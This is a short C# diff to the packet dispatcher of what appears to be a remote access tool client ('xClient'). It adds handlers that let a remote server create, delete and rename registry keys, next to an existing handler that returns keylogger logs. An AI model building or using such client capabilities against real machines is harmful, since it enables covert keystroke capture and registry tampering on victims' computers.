@@ -128,6 +128,18 @@ namespace xClient.Core.Packets
             {
                 CommandHandler.HandleGetRegistryKey((ServerPackets.DoLoadRegistryKey)packet, client);
             }
+            else if (type == typeof(ServerPackets.DoCreateRegistryKey))
+            {
+                CommandHandler.HandleCreateRegistryKey((ServerPackets.DoCreateRegistryKey)packet, client);
+            }
+            else if (type == typeof(ServerPackets.DoDeleteRegistryKey))
+            {
+                CommandHandler.HandleDeleteRegistryKey((ServerPackets.DoDeleteRegistryKey)packet, client);
+            }
+            else if (type == typeof(ServerPackets.DoRenameRegistryKey))
+            {
+                CommandHandler.HandleRenameRegistryKey((ServerPackets.DoRenameRegistryKey)packet, client);
+            }
             else if (type == typeof(ServerPackets.GetKeyloggerLogs))
             {
                 CommandHandler.HandleGetKeyloggerLogs((ServerPackets.GetKeyloggerLogs)packet, client);
